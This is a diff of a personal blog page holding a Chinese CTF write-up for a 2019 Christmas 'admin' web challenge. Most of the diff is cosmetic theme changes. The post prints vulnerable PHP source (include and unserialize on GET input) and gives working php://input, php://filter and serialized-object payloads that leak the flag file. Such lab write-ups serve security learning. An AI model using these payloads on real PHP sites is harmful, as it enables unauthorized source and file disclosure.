@@ -57,10 +57,10 @@
   <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
 
 
-  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/cat32.png?v=5.1.4">
 
 
-  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/cat16.png?v=5.1.4">
 
 
   <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
@@ -84,7 +84,7 @@
 <meta property="og:type" content="article">
 <meta property="og:title" content="圣诞夺旗admin-wp">
 <meta property="og:url" content="http://yoursite.com/2019/12/25/%E5%9C%A3%E8%AF%9E%E5%A4%BA%E6%97%97admin-wp/index.html">
-<meta property="og:site_name" content="个人博客">
+<meta property="og:site_name" content="deleのblog">
 <meta property="og:description" content="2019圣诞ctf大旗大赛web-admin打开题目查看源代码：  三个get值，user，file，pass； 代码提示需要user&#x3D;admin，file_get_contents()是post形式提交； 这里要用到php:&#x2F;&#x2F;filter协议中的php:&#x2F;&#x2F;input; file提示我们打开class.php; pass暂时没有要求； 构造payload;   看到这里就想到应该是考察php：">
 <meta property="og:image" content="https://s2.ax1x.com/2019/12/26/lEZ8IK.png">
 <meta property="og:image" content="https://s2.ax1x.com/2019/12/26/lEZ7JU.png">
@@ -132,7 +132,7 @@
 
 
 
-  <title>圣诞夺旗admin-wp | 个人博客</title>
+  <title>圣诞夺旗admin-wp | deleのblog</title>
   
 
 
@@ -165,7 +165,7 @@
     <div class="custom-logo-site-title">
       <a href="/"  class="brand" rel="start">
         <span class="logo-line-before"><i></i></span>
-        <span class="site-title">个人博客</span>
+        <span class="site-title">deleのblog</span>
         <span class="logo-line-after"><i></i></span>
       </a>
     </div>
@@ -196,6 +196,46 @@
               <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
             
             首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
           </a>
         </li>
       
@@ -237,11 +277,11 @@
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="dele">
       <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="image" content="/images/1.jpg">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="个人博客">
+      <meta itemprop="name" content="deleのblog">
     </span>
 
     
@@ -283,6 +323,25 @@
           
 
           
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  
+                </span>
+              
+
+              
+
+              
+            </div>
+          
 
           
 
@@ -310,25 +369,25 @@
 <p><img src="https://s2.ax1x.com/2019/12/26/lEZ7JU.png" alt="lEZ7JU.png"></p>
 <p><img src="https://s2.ax1x.com/2019/12/26/lEZLQJ.png" alt="lEZLQJ.png"></p>
 <p>看到这里就想到应该是考察php：//filter协议了，class.php没显示，构造payload:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;class.php</span><br></pre></td></tr></table></figure>
+<figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=<span class="symbol">php:</span>/<span class="regexp">/filter/convert</span>.base64-encode/resource=<span class="class"><span class="keyword">class</span>.<span class="title">php</span></span></span><br></pre></td></tr></table></figure>
 
 <p>base64解码：</p>
 <p><img src="https://s2.ax1x.com/2019/12/26/lEmZjJ.png" alt="lEmZjJ.png"></p>
 <p>要访问fffffflag.php；但并没有提示如何，尝试多次无果</p>
 <p>于是访问了下index.php；</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;120.55.43.255:28119&#x2F;?user&#x3D;php:&#x2F;&#x2F;input&amp;file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;index.php&amp;pass&#x3D;1post:admin</span><br></pre></td></tr></table></figure>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">120.55</span><span class="number">.43</span><span class="number">.255</span>:<span class="number">28119</span>/?<span class="keyword">user</span>=php://<span class="keyword">input</span>&amp;file=php://<span class="keyword">filter</span>/convert.base64-encode/resource=<span class="keyword">index</span>.php&amp;pass=<span class="number">1</span>post:<span class="keyword">admin</span></span><br></pre></td></tr></table></figure>
 
 <p>解码得：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(E_ALL &amp; ~E_NOTICE);</span><br><span class="line">$user &#x3D; $_GET[&quot;user&quot;];</span><br><span class="line">$file &#x3D; $_GET[&quot;file&quot;];</span><br><span class="line">$pass &#x3D; $_GET[&quot;pass&quot;];</span><br><span class="line"> </span><br><span class="line">if(isset($user)&amp;&amp;(file_get_contents($user,&#39;r&#39;)&#x3D;&#x3D;&#x3D;&quot;admin&quot;))&#123;</span><br><span class="line">    echo &quot;hello admin!&lt;br&gt;&quot;;</span><br><span class="line">    if(preg_match(&quot;&#x2F;fffffflag&#x2F;&quot;,$file))&#123;</span><br><span class="line">        exit();</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        include($file); &#x2F;&#x2F;class.php</span><br><span class="line">        $pass &#x3D; unserialize($pass);</span><br><span class="line">        echo $pass;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;you are not admin ! &quot;;</span><br><span class="line">    echo &quot;&lt;br&#x2F;&gt;&quot;;</span><br><span class="line">    echo &quot;hava a rest and then change your choose.&quot;;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">?&gt;</span><br><span class="line"> </span><br><span class="line">&lt;!--</span><br><span class="line">$user &#x3D; $_GET[&quot;user&quot;];</span><br><span class="line">$file &#x3D; $_GET[&quot;file&quot;];</span><br><span class="line">$pass &#x3D; $_GET[&quot;pass&quot;];</span><br><span class="line"> </span><br><span class="line">if(isset($user)&amp;&amp;(file_get_contents($user,&#39;r&#39;)&#x3D;&#x3D;&#x3D;&quot;admin&quot;))&#123;</span><br><span class="line">    echo &quot;hello admin!&lt;br&gt;&quot;;</span><br><span class="line">    include($file); &#x2F;&#x2F;class.php</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;you are not admin ! &quot;;</span><br><span class="line">&#125;</span><br><span class="line"> --</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(E_ALL &amp; ~E_NOTICE);</span><br><span class="line">$user = $_GET[<span class="string">"user"</span>];</span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line">$pass = $_GET[<span class="string">"pass"</span>];</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($user)&amp;&amp;(file_get_contents($user,<span class="string">'r'</span>)===<span class="string">"admin"</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"hello admin!&lt;br&gt;"</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/fffffflag/"</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($file); <span class="comment">//class.php</span></span><br><span class="line">        $pass = unserialize($pass);</span><br><span class="line">        <span class="keyword">echo</span> $pass;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"you are not admin ! "</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"hava a rest and then change your choose."</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"> </span><br><span class="line">&lt;!--</span><br><span class="line">$user = $_GET[<span class="string">"user"</span>];</span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line">$pass = $_GET[<span class="string">"pass"</span>];</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($user)&amp;&amp;(file_get_contents($user,<span class="string">'r'</span>)===<span class="string">"admin"</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"hello admin!&lt;br&gt;"</span>;</span><br><span class="line">    <span class="keyword">include</span>($file); <span class="comment">//class.php</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"you are not admin ! "</span>;</span><br><span class="line">&#125;</span><br><span class="line"> --</span><br></pre></td></tr></table></figure>
 
 <p>重点在：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">if(isset($user)&amp;&amp;(file_get_contents($user,&#39;r&#39;)&#x3D;&#x3D;&#x3D;&quot;admin&quot;))&#123;</span><br><span class="line">    echo &quot;hello admin!&lt;br&gt;&quot;;</span><br><span class="line">    if(preg_match(&quot;&#x2F;fffffflag&#x2F;&quot;,$file))&#123;</span><br><span class="line">        exit();</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        include($file); &#x2F;&#x2F;class.php</span><br><span class="line">        $pass &#x3D; unserialize($pass);</span><br><span class="line">        echo $pass;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$user</span>)&amp;&amp;(file_get_contents(<span class="variable">$user</span>,<span class="string">'r'</span>)===<span class="string">"admin"</span>))&#123;</span><br><span class="line">    echo <span class="string">"hello admin!&lt;br&gt;"</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/fffffflag/"</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        include(<span class="variable">$file</span>); <span class="regexp">//</span>class.php</span><br><span class="line">        <span class="variable">$pass</span> = unserialize(<span class="variable">$pass</span>);</span><br><span class="line">        echo <span class="variable">$pass</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
 
 
 
 <p>这两句代码再结合之前的Read类，是要反序列化构建pass类才可以。</p>
 <p>构建payload:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?user&#x3D;php:&#x2F;&#x2F;input&amp;file&#x3D;class.php&amp;pass&#x3D;O:4:&quot;Read&quot;:1:&#123;s:4:&quot;file&quot;;s:62:&quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;fffffflag.php&quot;;&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="keyword">user</span>=php://<span class="keyword">input</span>&amp;file=<span class="keyword">class</span>.php&amp;pass=O:<span class="number">4</span>:"Read":<span class="number">1</span>:&#123;s:<span class="number">4</span>:"file";s:<span class="number">62</span>:"php://filter/read=convert.base64-encode/resource=fffffflag.php";&#125;</span><br></pre></td></tr></table></figure>
 
 <p>得到flag;</p>
 <p><a href="https://imgchr.com/i/lEnaM4" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/12/26/lEnaM4.md.png" alt="lEnaM4.md.png"></a></p>
@@ -436,8 +495,12 @@
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
+              <img class="site-author-image" itemprop="image"
+                src="/images/1.jpg"
+                alt="dele" />
+            
               <p class="site-author-name" itemprop="name">dele</p>
-              <p class="site-description motion-element" itemprop="description">记录</p>
+              <p class="site-description motion-element" itemprop="description">记录个人学习的脚步</p>
           </div>
 
           <nav class="site-state motion-element">
@@ -445,7 +508,7 @@
             
               <div class="site-state-item site-state-posts">
               
-                <a href="/archives">
+                <a href="/archives/%7C%7Carchive">
               
                   <span class="site-state-item-count">21</span>
                   <span class="site-state-item-name">日志</span>
